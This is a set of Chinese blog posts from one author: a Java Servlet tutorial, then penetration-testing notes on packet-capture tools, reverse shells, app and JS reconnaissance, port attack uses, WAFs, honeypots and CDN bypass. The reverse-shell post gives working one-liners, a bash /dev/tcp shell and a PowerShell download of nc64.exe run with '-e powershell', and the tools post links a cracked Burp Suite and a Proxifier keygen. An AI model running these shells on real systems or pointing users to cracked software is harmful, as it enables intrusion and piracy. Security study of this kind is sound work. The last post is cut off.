[{"id":"9116ce8cd7513e24b93bb0c7493010d2","title":"JavaEE应用-Servlet","content":"JavaEE应用-ServletJavaEE 基础一：Servlet 实现继承抽象类 HttpServlet 的重写部分方法（常用）\n添加注解 @WebServlet(“&#x2F;LoginServlet”)\n\n\n\n\n\n\n\n\n\nservlet3.0 引入了 @WebServlet,@WebFilter 等注解，可以代替在 web.xml 中通过  等标签进行配置 , 从而可以摆脱掉 web.xml，@WebServlet(“&#x2F;LoginServlet”)\n创建 Indexservlet 的类    package com.example.demo2;\ntxtimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n/**\n* servlet实现\n* 1，创建Class类\n* 2，继承HttpServlet类\n* 3，重写Service()方法(Service方法在Servelt类被访问时自动调用，作用：接受请求，响应结果)\n* 4，在Servlet中添加注解，设置资源对位访问路径，浏览器通过访问路径，访问到Servlet类\n*/\n\n@WebServlet(&quot;/ser01&quot;) //添加注解，访问路径\npublic class Indexservlet extends HttpServlet &#123;  \n    @Override\n    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        System.out.println(&quot;Hello,Indexservlet&quot;);  //输出在控制台\n        //响应数据\n        resp.getWriter().write(&quot;Hello,Index&quot;);  //输出到客户端\n    &#125;\n&#125;二：Servlet 的工作流程与生命周期Servlet 的生命周期可以分为四个阶段，即装载类及创建实例阶段、初始化阶段、服务阶段和实例销毁阶段。\n\n1、初始化阶段  调用 init () 方法\n2、响应客户请求阶段。调用 service () 方法，由 service () 方法根据提交的方式选择执行 doGet () 或者 doPost () 方法\n3、终止阶段　　调用 destroy () 方法\n\n工作流程：\n\n通过请求头获知浏览器访问的是哪个主机\n在通过请求行获取访问的是哪个 web 应用\n再通过请求行中的请求路径获知访问的是哪个资源\n通过获取的资源路径在配置中匹配到真实路径\n服务器会创建 servlet 对象，（如果第一次访问时，创建 - servlet 实例，并调用 init 方法进行初始化操作）\n调用 service（request，response）方法来处理请求和响应的操作\n调用 service 完毕后返回服务器 由服务器将 response 缓冲区的数据取出\n\n三，HttpServleRequest 对象作用：主要用来接受客户端发送过来的请求信息。例如：请求的参数，发送的头信息等都属于客户端发来的信息，service () 方法中的形参接受的是 HttpServletRequest 接口的实例化对象，表示对象主要运用在 HTTP 协议上，该对象有 Tomcat 封装好传递过来\n接受请求：\n常用方法：\ngetRequestURL ()：获取客户端发出请求时的完整 URL\ngetRequestURL ()：获取请求行中的资源名称部分（项目名称开始）\ngetQueryString ()：获取请求行中的参数部分\ngetMethod ()：获取客户端的请求方式\ngetProtocol ()：获取 HTTP 版本号\ngetContextPath ()：获取 webapp 名字（站点名）\ntxt        String url = req.getRequestURL().toString();\n        System.out.println(&quot;获取客户端请求的完整URL &quot;+url);\n        //获取客户端请求的完整URL （从http 开始，到？前面结束）\n        String uri = req.getRequestURI();\n        System.out.println(&quot;获取客户端请求的完整URi &quot;+uri);\n        //获取请求中的参数部分\n        String queryString=req.getQueryString();\n        System.out.println(&quot;获取请求中的参数部分:&quot;+queryString);\n        //获取客户端的请求方式\n        String method = req.getMethod();\n        System.out.println(&quot;获取客户端的请求方式:&quot;+method);\n        //获取HTTP版本号\n        String protocol=req.getProtocol();\n        System.out.println(&quot;获取HTTP版本号:&quot;+protocol);\n        //获取webapp名字（站点名）\n        String webapp =req.getContextPath();\n        System.out.println(&quot;获取webapp名字（站点名）:&quot;+webapp);\n\n/**\n        *获取请求参数\n        *   1.通过参数名获取参数值， 返回字符串\n        *   req.getParameter(&quot;参数名&quot;);\n        *      参数名：\n        *         1.表达元素name属性值\n        *         2.ajax的data属性值的键\n        *         3.超链接参数的键\n        *   2.通过参数名获取所有的参数值，返回数组\n        *\n        **   */\n        //获取用户名\n        String uname = req.getParameter(&quot;unmae&quot;);\n        String upwd = req.getParameter(&quot;upwd&quot;);\n        System.out.println(&quot;姓名：&quot;+uname+&quot;密码&quot;+upwd);\n\n        //通过参数名获取所有的参数值，返回数组\n        String[] hobby =req.getParameterValues(&quot;hobby&quot;);\n        System.out.println(hobby.length);请求转发：\n请求转发，是一种服务器的行为，当客户端请求达到后，服务器进行准发，此时会将请求对象进行保存，地址栏中的 URL 地址不会改变，得到响应后，服务端在响应发送给客户端，从始至终只有一个请求发出。\ntxtrequest.getRequestDispatcher(url).forward(request.response);Request 作用域\n通过该对象可以在一个请求中传递数据，作用范围：在一次请求中有效，即服务跳转有效\ntxt//设置域对象内容\nrequest.setAttribute(String name,String value);\n//获取域对象内容\nrequest.getAttrbute(String name);\n//删除域对象内容\nrequest.removeAttrbute(String name);request 域对象中的数据在一次请求中有效，则经过请求转发，request 域中的数据依然存在，则在请求转发的过程中可以通过 request 来传输 &#x2F; 共享数据\n响应数据接收到客户端请求后，可以通过 HttpServletResponse 对象直接进行响应，响应时需要获取输出流。有两种形式:getWriter() 获取字符流 (只能响应回字符)getOutputStream() 获取字节流 (能响应一切数据)\n重定向\n重定向是一种服务器指导，客户端的行为。客户端发出第一个请求，被服务器接收处理后，服务器会进行响应，在响应的同时，服务器会给客户端一个新的地址，当客户端接收到响应后，会立刻、马上、自动根据服务器给的新地址发起第二个请求，服务器接收请求并作出响应，重定向完成。\ntxtresp.sendRedirect(&quot;url&quot;);请求转发与重定向的区别\n\n\n请求转发的地址栏不发生改变，重定向的地址会被改变\n\n\n\n请求转发是服务端跳转，重定向是客户端跳转\n\n\n\n请求转发是一次请求，重定向是两次请求\n\n\n\n请求转发是 request 作用域可以共享，重定向是不可以共享\n\n\n\n请求转发的地址是跳转到当前项目的资源，重定向可以跳转到任意资源\n\n  package com.example.demo2;\n  import javax.servlet.ServletException;  import javax.servlet.annotation.WebServlet;  import javax.servlet.http.HttpServlet;  import javax.servlet.http.HttpServletRequest;  import javax.servlet.http.HttpServletResponse;  import java.io.IOException;\n  @WebServlet(“&#x2F;ser03”)  public class servlet03 extends HttpServlet{          @Override          protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {              System.out.println(“yes…..”);\ntxt          String name = req.getParameter(&quot;name&quot;);\n          String pwd = req.getParameter(&quot;pwd&quot;);\n\n                  System.out.println(&quot;servlet...&quot;);\n\n                  //请求转发(服务端)  &#x2F;&#x2F;        req.getRequestDispatcher(“index.jsp”).forward(req,resp);\ntxt                  //重定向 跳转到首页（服务端）\n                  resp.sendRedirect(&quot;http://www.baidu.com&quot;);\n                  //跳转到百度\n      &#125;  }\n\n\nCookie 对象通过 new Cookie (“key” “value”); 来创建一个 Cookie 对象，要想将 Cookie 随响应发送到客户端，需要先添加到 response 对象中，response.addCookie (cookie); 此时该 cookie 对象则随着响应发送至了客户端。在浏览器上可以看见\ncookie 获取\ntxtCookie cookie =new Cookie(&quot;uname&quot;,&quot;admin&quot;);\n        \n//响应cookie对象\nresp.addCookie(cookie);\n\n\n\npackage com.shsxt.servlet.Cookie;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n/**\n* Cookie\n*     是浏览器技术\n* Cookie对象的创建与发送\n* */\n\n@WebServlet(&quot;/cook01&quot;)\npublic class Cookie01 extends HttpServlet &#123;\n    @Override\n    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n\n        //得到Cookie对象\n\n        Cookie cookie =new Cookie(&quot;uname&quot;,&quot;admin&quot;);\n\n        //响应cookie对象\n        resp.addCookie(cookie);\n    &#125;\n&#125;\nCookie 的路径\ntxtCookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。\n\n        // 1.当前服务器下，任务项目的任意资源，都可获取Cookie对象\n        Cookie cookie01=new Cookie(&quot;aa&quot;,&quot;AA&quot;);\n        cookie01.setPath(&quot;/&quot;);\n        resp.addCookie(cookie01);\n\n//      2.在当前项目下，可以获取cookie对象（默认）\n        Cookie cookie02=new Cookie(&quot;bb&quot;,&quot;BB&quot;);\n        cookie02.setPath(&quot;/zhongsheng&quot;);\n        resp.addCookie(cookie02);\n//        3.在指定项目下，可获取cookie对象（指定项目站点名：/s05）\n        Cookie cookie03=new Cookie(&quot;cc&quot;,&quot;CC&quot;);\n        cookie03.setPath(&quot;/ser05&quot;);\n        resp.addCookie(cookie03);\n//        4.在指定项目的指定资源下，以获取cookie对象\n        Cookie cookie04=new Cookie(&quot;dd&quot;,&quot;DD&quot;);\n        cookie04.setPath(&quot;/zhongsheng/test&quot;);\n        resp.addCookie(cookie04);Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。*当前项目：站点名为：&#x2F;zhongsheng当前服务域名为：localhost:8080设置路径：setpath (), 默认当前项目的站点名setPath(“&#x2F;zhongsheng”)*\n\n\n当前服务器下，任务项目的任意资源，都可获取 Cookie 对象\n\n\nserpath(“&#x2F;”);\n\n在当前项目下，可以获取 cookie 对象（默认）\n\n\nsetPath（“&#x2F;zhongsheng”）\n\n在指定项目下，可获取 cookie 对象（指定项目站点名：&#x2F;s05）\n\n\nsetPath（“&#x2F;s05”）\n\n在指定项目的指定资源下，以获取 cookie 对象setPath（“&#x2F;zhongsheng&#x2F;ser12”）;\n\n\n\nHttpSesion 对象\n对于服务器而言，每一个连接到它的客户端都是一个 session，servlet 容器使用此接口创建 HTTP 客户端和 HTTP 服务器之间的会话。会话将保留指定的时间段，跨多个连接或来自用户的页面请求。一个会话通常对应于一个用户，该用户可能多次访问一个站点。可以通过此接口查看和操作有关某个会话的信息，比如会话标识符、创建时间和最后一次访问时间。在整个 session 中，最重要的就是属性的操作。\nsession 无论客户端还是服务器端都可以感知到，若重新打开一个新的浏览器，则无法取得之前设置的 session，因为每一个 session 只保存在当前的浏览器当中，并在相关的页面取得。\nSession 的作用就是为了标识一次会话，或者说确认一个用户；并且在一次会话（一个用户的多次请求）期间共享数据。我们可以通过 request.getSession () 方法，来获取当前会话的 session 对象。\ntxt//创建获取Session\nHttpSession session =req.getSession();\n//设置sessiony标识符 JSESSIONID\nSession 既然是为了标识一次会话，那么此次会话就应该有一个唯一的标志，这个标志就是 sessionld。\n每当一次请求到达服务器，如果开启了会话 (访问了 session)，服务器第一步会查看是否从客户端回传一个名为 JSESSIONID 的 cookie，如果没有则认为这是一次新的会话，会创建一个新的 session 对象，并用唯一的 sessionld 为此次会话做一个标志。如果有 JESSIONID 这个 cookie 回传，服务器则会根据 JSESSIONID 这个值去查看是否含有 id 为 JSESSION 值的 session 对象，如果没有则认为是一个新的会话，重新创建一个新的 session 对象，并标志此次会话；如果找到了相应的 session 对象，则认为是之前标志过的一次会话共享。\n这里提到一个叫做 JSESSIONID 的 cookie，这是一个比较特殊的 cookie，当用户请求服务器时，如果访问了 session，则服务器会创建一个名为 JSESSIONID，值为获取到的 session (无论是获取到的还是新创建的) 的 sessionld 的 cookie 对象，并添加到 response 对象中，响应给客户端，有效时间为关闭浏览器。\n所以 Session 的底层依赖 Cookie 来实现。\ntxtpackage com.shsxt.servlet.Session;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\n/**\n* Session的作用域\n*\n*    再一次会话中有效\n*    通过setAttribute(name , value)方法向域对象中添加数据\n*    通过getAttribute(name)从域对象中获取数据\n*    通过removeArribute（name）从域对象移除数据\n*\n*    request作用域\n*       知在一次请求有效\n*       只在请求转发跳转有效\n*    session作用域：\n*        在一次会话中有效，会话中包含多次请求\n*        在请求转发与重定向跳转后都有效\n*        \n**/\n\n@WebServlet(&quot;/ses02&quot;)\npublic class Session02 extends HttpServlet &#123;\n    @Override\n    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n\n        //创建获取Session\n        HttpSession session =req.getSession();\n        System.out.println(&quot;session02&quot;+session.getId());\n\n        //request作用域\n        req.setAttribute(&quot;requestMsg&quot;,&quot;request的作用域&quot;);\n\n        //session作用域\n        session.setAttribute(&quot;sessionMsg&quot;,&quot;session的作用域&quot;);\n\n        //请求转发\n//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);\n        //重定向\n        resp.sendRedirect(&quot;index.jsp&quot;);\n\n\n    &#125;\n&#125;","slug":"JavaEE应用-Servlet","date":"2025-05-16T15:14:11.789Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"debbc591069b02b5cd9e83564e08a4e5","title":"抓包工具","content":"抓包工具BurpSuite 破解版\nhttps://pan.baidu.com/s/1yUcTEeJVETKjsw3RQq76vw?pwd=smar\n提取码: smar\n安装 JAVA 的环境，剩下步骤百度搜索即可完成\nWireshark\nhttps://www.wireshark.org\nCharles\nhttps://www.charlesproxy.com/download\nFidder\nhttps://www.telerik.com/fiddler\nProxifier\nhttps://proxifiter.com\n破解：https://github.com/y9nhjy/Proxifier-Keygen\n\none-fox集成工具箱等\n","slug":"抓包工具","date":"2025-05-16T15:10:32.952Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"6f3ffbe16670f56708a213e2b17439a8","title":"基础知识-反弹shell","content":"基础知识-反弹shell常见渗透命令：\nhttps://blog.csdn.net/weixin_43303273/article/details/83029138\n命令生成：\nhttps://forum.ywhack.com/bountytips.php?download\nLinux：wget curl python ruby perl java 等\nWindows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等\n反弹 shell 命令：\nhttps://forum.ywhack.com/shell.php\n常见的：\ntxtnc -lvnp 443    //监听443端口\n\n/bin/bash -i &gt;&amp; /dev/tcp/ip/443 0&gt;&amp;1      //linuxWindows:\nnc64.exe：https://github.com/vinsworldcom/NetCat64/releases\ntxtpowershell -c wget ip/nc64.exe -outfile \\\\programdata\\\\nc64.exe //通过漏洞上传nc64.exe\n\\\\programdata\\\\nc64.exe -e powershell ip 443","slug":"基础知识-反弹shell,","date":"2025-05-16T15:06:21.704Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"736b272bc4323f631971065b45670c5f","title":"信息收集-3","content":"信息收集-3APP 信息收集\n名称获取 APP 信息（爱企查 &#x2F; 小蓝本 &#x2F; 七麦 &#x2F; 点点）\n1、爱企查知识产权\n2、七麦 &amp; 点点查名称\nhttps://www.xiaolanben.com\nhttps://aiqicha.baidu.com\nhttps://www.qimai.cn\nhttps://app.diandian.com\n通过获取 App 配置、数据包，去获取 url、api、osskey、js 等敏感信息。\n1、资产信息 - IP 域名 网站 - 转到对应 Web 测试 接口测试 服务测试\n2、泄露信息 - 配置 key 资源文件 – key（osskey 利用，邮件配置等）\n3、代码信息 - java 代码安全问题 - 逆向相关\nAPP 中收集资产\n1、抓包 - 动态表现\n2、提取 - 静态表现 &amp; 动态调试\n3、搜索 - 静态表现\n1、抓包抓表现出来的数据\n优点：没有误报\n缺点：无法做到完整\n2、反编译从源码中提取数据\n优点：数据较为完整\n缺点：有很多无用的资产\n3、动态调试从表现中提取数据\n优点：没有误报，解决不能抓包不能代理等情况\n优点；搞逆向的人能看到实时的 app 调用链等\n缺点：无法做到完整\n例子：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包抓到了）\n原因：那个登录界面是 APP 打包的资源，并没有对外发送数据\n静态分析：\nAppInfoScanner：\n该产品适用于以 HW 行动 &#x2F; 红队 &#x2F; 渗透测试团队为场景的移动端（Android、iOS、WEB、H5、静态网站）信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：标题、域名、CDN、指纹信息、状态信息等。\nhttps://github.com/kelvinBen/AppInfoScanner\nAndroid 相关基本操作：\n对本地 APK 文件进行扫描\ntxtpython app.py android -i &lt;Your apk file&gt;  \n例：\npython app.py android -i C:\\Users\\Administrator\\Desktop\\Demo.apkiOS 相关基本操作：对本地 IPA 文件进行扫描    python app.py ios -i 例:    python app.py ios -i “C:\\Users\\Administrator\\Desktop\\Demo.ipa” \nWeb 相关基本操作：对本地 WEB 站点进行扫描    python app.py web -i 例:    python app.py web -i “C:\\Users\\Administrator\\Desktop\\Demo.html” \n移动安全框架（MobSF）\n移动安全框架（MobSF）是一个自动化、一体化的移动应用程序（Android&#x2F;iOS&#x2F;Windows）渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩的源代码，并提供 REST API，以便与 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器帮助您执行运行时安全性评估和交互式检测测试。\nhttps://github.com/MobSF/Mobile-Security-Framework-MobSF\n所需环境：\n本篇以 Windows 为例\n1、安装 Git（示例版本 Git 2.35.1）\n2、安装 Python 3.8-3.9（示例版本 Python 3.8.10）\n3、安装 JDK 8+（示例版本 JDK 1.8.0_172）\n4、安装 Microsoft Visual C++ Build Tools\n5、安装 OpenSSL（non-light）\n6、安装 wkhtmltopdf，并将包含 wkhtmltopdf 的二进制文件路径添加到\n环境变量 PATH 里\n运行： run.bat 127.0.0.1:8000\n动态抓包：\n使用抓包工具 Burp 等\n动态调试：\nMobsf 工具中的动态调试 + 模拟器\n","slug":"信息收集-3","date":"2025-05-16T14:31:55.601Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"56857bf9b8c05cf6ebfcec9910c5d693","title":"信息收集-2","content":"信息收集-2常见端口：\n\n\n\n端口\n服务\n渗透用途\n\n\n\ntcp 20,21\nFTP\n允许匿名的上传下载，爆破，嗅探，win 提权，远程执行 (proftpd1.3.5), 各类后门 (proftpd,vsftp 2.3.4)\n\n\ntcp 22\nSSH\n可根据已搜集到的信息尝试爆破，v1 版本可中间人，ssh 隧道及内网代理转发，文件传输等等\n\n\ntcp 23\nTelnet\n爆破，嗅探，一般常用于路由，交换登陆，可尝试弱口令\n\n\ntcp 25\nSMTP\n邮件伪造，vrfy&#x2F;expn 查询邮件用户信息，可使用 smtp-user enum 工具来自动跑\n\n\ntcp&#x2F;udp 53\nDNS\n允许区域传送，dns 劫持，缓存投毒，欺骗以及各种基于 dns 隧道的远控\n\n\ntcp&#x2F;udp 69\nTFTP\n尝试下载目标及其的各类重要配置文件\n\n\ntcp 80-89,443,8440-8450,8080-8089\n各种常用的 Web 服务端口\n可尝试经典的 topn,vpn,owa,webmail, 目标 oa, 各类 Java 控制台，各类服务器 Web 管理面板，各类 Web 中间件漏洞利用，各类 Web 框架漏洞利用等等……\n\n\ntcp 110\nPOP3\n可尝试爆破，嗅探\n\n\ntcp 111,2049\nNFS\n权限配置不当\n\n\ntcp 137,139,445\nSamba\n可尝试爆破以及 smb 自身的各种远程执行类漏洞利用，如，ms08-067,ms17-010, 嗅探等……\n\n\ntcp 143\nIMAP\n可尝试爆破\n\n\nudp 161\nSNMP\n爆破默认团队字符串，搜集目标内网信息\n\n\ntcp 389\nLDAP\nldap 注入，允许匿名访问，弱口令\n\n\ntcp 512,513,514\nLinux rexec\n可爆破，rlogin 登陆\n\n\ntcp 873\nRsync\n匿名访问，文件上传\n\n\ntcp 1194\nOpenVPN\n想办法钓 VPN 账号，进内网\n\n\ntcp 1352\nLotus\n弱口令，信息泄漏，爆破\n\n\ntcp 1433\nSQL Server\n注入，提权，sa 弱口令，爆破\n\n\ntcp 1521\nOracle\ntns 爆破，注入，弹 shell\n\n\ntcp 1500\nISPmanager\n弱口令\n\n\ntcp 1723\nPPTP\n爆破，想办法钓 VPN 账号，进内网\n\n\ntcp 2082,2083\ncPanel\n弱口令\n\n\ntcp 2181\nZooKeeper\n未授权访问\n\n\ntcp 2601,2604\nZebra\n默认密码 zerbra\n\n\ntcp 3128\nSquid\n弱口令\n\n\ntcp 3312,3311\nkangle\n弱口令\n\n\ntcp 3306\nMySQL\n注入，提权，爆破\n\n\ntcp 3389\nWindows rdp\nshift 后门 [需要 03 以下的系统], 爆破，ms12-020\n\n\ntcp 3690\nSVN\nsvn 泄露，未授权访问\n\n\ntcp 4848\nGlassFish\n弱口令\n\n\ntcp 5000\nSybase&#x2F;DB2\n爆破，注入\n\n\ntcp 5432\nPostgreSQL\n爆破，注入，弱口令\n\n\ntcp 5900,5901,5\nVNC\n弱口令爆破\n\n\ntcp 5984\nCouchDB\n未授权导致的任意指令执行\n\n\ntcp 6379\nRedis\n可尝试未授权访问，弱口令爆破\n\n\ntcp 7001,7002\nWebLogic\nJava 反序列化，弱口令\n\n\ntcp 8000\nAjenti\n弱口令\n\n\ntcp 8009\ntomcat Ajp\nTomcat-Ajp 协议漏洞\n\n\ntcp 8443\nPlesk\n弱口令\n\n\ntcp 8069\nZabbix\n远程执行，SQL 注入\n\n\ntcp 8080-8089\nJenkins,JBoss\n反序列化，控制台弱口令\n\n\ntcp 9080-9081,9090\nWebSphere\nJava 反序列化 &#x2F; 弱口令\n\n\ntcp 9200,9300\nElasticSearch\n远程执行\n\n\ntcp 11211\nMemcached\n未授权访问\n\n\ntcp 27017,27018\nMongoDB\n爆破，未授权访问\n\n\ntcp 50070,50030\nHadoop\n默认端口未授权访问\n\n\n端口扫描：Nmap、Masscan、网络空间\nhttps://github.com/robertdavidgraham/masscan\nwaf:\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n遇到云 WAF，硬件 WAF 基本很难绕过，能绕过也没有什么可利用的东西\n蜜罐：\n低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。\n中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。\n高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击。\n原理：伪装与仿真：蜜罐模仿真实系统的服务和响应，让攻击者信以为真。\n监控与日志：系统详尽记录所有与蜜罐的交互，包括网络包、系统日志、命令行操作等。\n数据分析：利用自动化工具和人工分析来解析收集的数据，识别攻击模式和趋势。\n1，国外蜜罐产品\n一些常见的蜜罐产品包括：\n\nCowrie: Cowrie 是一个基于 Python 的 SSH&#x2F;Telnet 蜜罐，旨在模拟 SSH 和 Telnet 服务，并记录攻击者的行为。\nHoneyd: Honeyd 是一个虚拟蜜罐框架，可以模拟各种网络服务，并产生大量的虚假网络流量，以吸引攻击者。\nKippo: Kippo 是一个交互式 SSH 蜜罐，可以模拟 SSH 服务，并记录攻击者的输入和行为，以便分析和防御。\nGlastopf: Glastopf 是一个 Web 应用蜜罐，可以模拟各种 Web 服务，并记录攻击者的 Web 请求和攻击行为。\nThug: Thug 是一个低交互式蜜罐，可以模拟 Web 浏览器，并记录恶意网站的行为和攻击代码。\nDTK (Damn Vulnerable Linux)：一个故意设计漏洞的 Linux 发行版，常用于蜜罐部署和安全教育。\nConpot：专注于工业控制系统的蜜罐，模拟 SCADA 系统来检测针对工控网络的攻击。\n\n2，国内蜜罐产品\n\n知道创宇 - 创宇蜜罐：这是知道创宇公司推出的一款蜜罐产品，专门设计用于模拟真实环境，吸引并监测攻击者的行为，提供攻击预警与行为分析功能。\n长亭科技 - 谛听：长亭科技开发的谛听蜜罐系统，同样着眼于高仿真度和高交互性，能够有效吸引攻击者并收集其攻击手法与意图。\n\n基本识别方法：\n1.用 Nmap 等 Scan 工具，同一个机器同时开放很多 Port 的。\n2.因为很多蜜罐都设置在相同或临近的网段。所以，同一个网段（e.g. ／24），很多机器都开放相同的 Port，回应相似的 Response。\n3.去 Shodan／Censys 查\nCDN：\n\n传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机\n\n普通 CDN：用户访问域名–&gt;CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n带 WAF 的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n#CDN 配置及绕过：\n配置 1：加速域名 - 需要启用加速的域名\n配置 2：加速区域 - 需要启用加速的地区\n配置 3：加速类型 - 需要启用加速的资源\n#CDN 的判定：\n超级 Ping：https://17ce.com/\n超级 Ping：https://ping.chinaz.com/\n各地 ping（出现多个 ip 存在 CDN）\n后置：绑定 HOSTS 访问解析\nCDN 绕过：\n1，子域名访问真实 ip（与加速配置有关），国外访问（加速区域没有配置全球访问）\n2，漏洞利用，比如 RCE，SSRF\n3，邮件系统：让它主动给你发送邮件\n部署架构的邮件服务系统主动向用户发送邮件的话，邮件头部的源码会包含邮件服务系统的真实 ip\n对方使用第三方邮件发送就不存在 ip 比如：@126.com，@qq.com 等\n常见的邮箱出发点：\n1，RSS 订阅\n2，邮箱注册，激活处\n3，邮箱找回密码处\n4，产品更新的邮件推送\n5，某业务执行后发送的邮件通知\n6，员工邮箱，邮箱管理系统平台等入口的忘记密码\n你给未知的邮箱发送：（需要自己的邮箱服务器不能第三方）\n网站查询：\nhttps://get-site-ip.com/(参考)\n","slug":"信息收集-2","date":"2025-05-16T13:42:16.964Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"7ffaad9414de91782db2e38f54fe1af8","title":"信息收集-1","content":"信息收集-1CMS 指纹识别在线 cms 指纹识别：http://whatweb.bugscaner.com/look/\nWappalyzer：https://github.com/AliasIO/wappalyzer\nTideFinger 潮汐：http://finger.tidesec.net/\n云悉指纹：https://www.yunsee.cn/\nWhatWeb：GitHub – urbanadventurer&#x2F;WhatWeb: Next generation web scanner\n数字观星 Finger-P：https://fp.shuziguanxing.com/#/\n后端 - 闭源 - 配置不当 - 源码泄漏参考：https://www.secpulse.com/archives/124398.html\n备份：敏感目录文件扫描\nCVS：https://github.com/kost/dvcs-ripper\nGIT：https://github.com/lijiejie/GitHack\nSVN：https://github.com/callmefeifei/SvnHack\nDS_Store：https://github.com/lijiejie/ds_store_exp\ncomposer.json：php 中，composer.json, 它描述了组件的信息: 名称 , 描述 , 关键词 , 作者 , GitHub 仓库地址…\ngit 源码泄露，svn 源码泄露，hg 源码泄漏，网站备份压缩文件，WEB-INF&#x2F;web.xml 泄露，DS_Store 文件泄露，SWP 文件泄露，CVS 泄露，Bzr 泄露，GitHub 源码泄漏\n有些小公司，或者黑色产业，会使用网上的源码进行搭建自己的 app 等，对网上的源码进行比对\n站长服务中心 — 网络维护服务市场，身边的技术服务顾问 – 互站网\n什么是 JS 渗透测试？在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\nJS 安全问题源码泄漏\n未授权访问 &#x3D; JS 里面分析更多的 URL 访问确定接口路径\n敏感 key 泄漏 &#x3D; JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）\nAPI 接口安全 &#x3D;（代码中加密提交参数传递，更多的 URL 路径）\n手工分析模式：1，先用 network 2，用 wappalyzer 查看框架 3，只看 js（vue.js) 4,看 admin&#x2F;login 等这种 5,ctrl + shift +f 搜索获取价值信息。\n快速获取价值信息src&#x3D;\npath&#x3D;\nmethod&#x3D;”get”、method&#x3D;”post”\nhttp.get(“、http.post(“\n$.ajax\nhttp://service.httpget\nhttp://service.httppost\nJS 前端架构 — 半自动 Burp官方插件：JS Link Finder &amp; JS Miner\n第三方插件：HaE &amp; Unexpected_information\nUnexpected_information：https://github.com/ScriptKid-Beta/Unexpected_information\n用来标记请求包中的一些敏感信息、JS 接口和一些特殊字段，防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。\nHaE：https://github.com/gh0stkey/HaE\n基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。\nJS 网络扫描工具：JSFinder，URLFinder，ffuf-FUZZ，Packer-Fuzzer，Findsomething\n1，JSFinder: 一款用作快速在网站的 js 文件中提取 URL，子域名的工具。\nhttps://github.com/Threezh1/JSFinder\n2，URLFinder: 更专注于提取页面中的 JS 与 URL 链接，提取的数据更完善且可查看状态码、内容大小、标题等\nhttps://github.com/pingc0y/URLFinder\ntxtURLFinder.exe -u http://www.baidu.com -s all -m 23，ffuf-FUZZ：爆破找到更多的 js 文件分析更多的信息https://github.com/ffuf/ffuf\nhttps://wordlists.assetnote.io （下载字典网址）功能强大的模糊化工具，用它来 FUZZ 模糊化 js 文件。\ntxtffuf.exe -w 字典.txt -u &lt;域名&gt;/FUZZ -t 200 -of csv -o 2.csv4，Packer-Fuzzer：一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具。\nhttps://github.com/rtcatc/Packer-Fuzzer\n5，Findsomething：从表现中 JS 中提取 URL 或者敏感数据（包括请求的资源、接口的 url，请求的 ip 